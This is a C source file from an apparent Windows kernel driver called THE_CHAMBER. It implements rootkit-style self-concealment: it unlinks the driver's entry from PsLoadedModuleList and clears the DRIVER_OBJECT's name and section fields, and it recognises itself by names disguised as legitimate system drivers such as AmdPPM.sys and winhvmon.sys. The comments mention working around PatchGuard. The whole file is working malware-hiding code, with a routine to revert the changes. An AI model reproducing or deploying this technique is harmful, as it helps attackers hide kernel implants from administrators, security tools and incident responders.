/* stealth.c -- module self-concealment for THE_CHAMBER.
 * Removes our driver image from PsLoadedModuleList and clears
 * DriverName/DriverSection on the DRIVER_OBJECT so enumerators that
 * walk NtQuerySystemInformation(SystemModuleInformation) do not see us.
 *
 * Patch Guard warning: PG scans PsLoadedModuleList structural invariants on
 * some newer Windows builds. Revert restores both FLINK and BLINK before
 * driver unload. */

#include "the_chamber.h"
#include "stealth.h"

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

extern LIST_ENTRY PsLoadedModuleList;

/* Saved revert state */
static PLIST_ENTRY       g_saved_flink       = NULL;
static PLIST_ENTRY       g_saved_blink       = NULL;
static PLIST_ENTRY       g_saved_mem_flink   = NULL;
static PLIST_ENTRY       g_saved_mem_blink   = NULL;
static PLIST_ENTRY       g_saved_init_flink  = NULL;
static PLIST_ENTRY       g_saved_init_blink  = NULL;
static PKLDR_DATA_TABLE_ENTRY g_saved_entry  = NULL;
static UNICODE_STRING    g_saved_driver_name = { 0, 0, NULL };
static PVOID             g_saved_driver_section = NULL;

/* Match our driver by comparing BaseDllName against known aliases. */
static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e) {
    static const WCHAR *names[] = {
        L"winhvmon.sys",
        L"amdsvcnt.sys",
        L"AmdPPM.sys",
        L"svchvdd.sys",
        L"IntcSvcLsrv.sys",
    };
    USHORT n = e->BaseDllName.Length / sizeof(WCHAR);
    PWCH p = e->BaseDllName.Buffer;
    SIZE_T i;
    if (!p || n == 0) return FALSE;
    for (i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
        SIZE_T want_n = 0;
        while (names[i][want_n]) want_n++;
        if (n == want_n) {
            SIZE_T j; BOOLEAN eq = TRUE;
            for (j = 0; j < want_n; j++) {
                WCHAR a = p[j]; WCHAR b = names[i][j];
                if (a >= L'A' && a <= L'Z') a = (WCHAR)(a - L'A' + L'a');
                if (b >= L'A' && b <= L'Z') b = (WCHAR)(b - L'A' + L'a');
                if (a != b) { eq = FALSE; break; }
            }
            if (eq) return TRUE;
        }
    }
    return FALSE;
}

NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
    PLIST_ENTRY head, cur;
    KIRQL irql;
    static KSPIN_LOCK dummy;
    KeInitializeSpinLock(&dummy);

    KeAcquireSpinLock(&dummy, &irql);

    head = &PsLoadedModuleList;
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PKLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (is_our_module(e)) {
            /* Save revert state */
            g_saved_entry      = e;
            g_saved_flink      = e->InLoadOrderLinks.Flink;
            g_saved_blink      = e->InLoadOrderLinks.Blink;
            g_saved_mem_flink  = e->InMemoryOrderLinks.Flink;
            g_saved_mem_blink  = e->InMemoryOrderLinks.Blink;
            g_saved_init_flink = e->InInitializationOrderLinks.Flink;
            g_saved_init_blink = e->InInitializationOrderLinks.Blink;

            /* Unlink from all three lists */
            RemoveEntryList(&e->InLoadOrderLinks);
            RemoveEntryList(&e->InMemoryOrderLinks);
            RemoveEntryList(&e->InInitializationOrderLinks);

            /* Make Flink/Blink point at itself to avoid dangling pointers */
            e->InLoadOrderLinks.Flink = &e->InLoadOrderLinks;
            e->InLoadOrderLinks.Blink = &e->InLoadOrderLinks;
            e->InMemoryOrderLinks.Flink = &e->InMemoryOrderLinks;
            e->InMemoryOrderLinks.Blink = &e->InMemoryOrderLinks;
            e->InInitializationOrderLinks.Flink = &e->InInitializationOrderLinks;
            e->InInitializationOrderLinks.Blink = &e->InInitializationOrderLinks;
            break;
        }
    }

    KeReleaseSpinLock(&dummy, irql);

    /* Clear DriverName + DriverSection on the DRIVER_OBJECT */
    if (drv) {
        g_saved_driver_name    = drv->DriverName;
        g_saved_driver_section = drv->DriverSection;
        drv->DriverName.Length         = 0;
        drv->DriverName.MaximumLength  = 0;
        drv->DriverName.Buffer         = NULL;
        drv->DriverSection             = NULL;
    }

    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "WinHvMon: stealth applied\n");
    return STATUS_SUCCESS;
}

NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
    KIRQL irql;
    static KSPIN_LOCK dummy;
    KeInitializeSpinLock(&dummy);

    if (!g_saved_entry) return STATUS_SUCCESS;

    KeAcquireSpinLock(&dummy, &irql);

    /* Restore links on each list */
    g_saved_entry->InLoadOrderLinks.Flink          = g_saved_flink;
    g_saved_entry->InLoadOrderLinks.Blink          = g_saved_blink;
    g_saved_entry->InMemoryOrderLinks.Flink        = g_saved_mem_flink;
    g_saved_entry->InMemoryOrderLinks.Blink        = g_saved_mem_blink;
    g_saved_entry->InInitializationOrderLinks.Flink = g_saved_init_flink;
    g_saved_entry->InInitializationOrderLinks.Blink = g_saved_init_blink;

    /* Fix the neighbor's pointers back at us */
    if (g_saved_flink) g_saved_flink->Blink = &g_saved_entry->InLoadOrderLinks;
    if (g_saved_blink) g_saved_blink->Flink = &g_saved_entry->InLoadOrderLinks;
    if (g_saved_mem_flink) g_saved_mem_flink->Blink = &g_saved_entry->InMemoryOrderLinks;
    if (g_saved_mem_blink) g_saved_mem_blink->Flink = &g_saved_entry->InMemoryOrderLinks;
    if (g_saved_init_flink) g_saved_init_flink->Blink = &g_saved_entry->InInitializationOrderLinks;
    if (g_saved_init_blink) g_saved_init_blink->Flink = &g_saved_entry->InInitializationOrderLinks;

    KeReleaseSpinLock(&dummy, irql);

    /* Restore DriverObject fields */
    if (drv) {
        drv->DriverName    = g_saved_driver_name;
        drv->DriverSection = g_saved_driver_section;
    }

    g_saved_entry = NULL;
    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "WinHvMon: stealth reverted\n");
    return STATUS_SUCCESS;
}
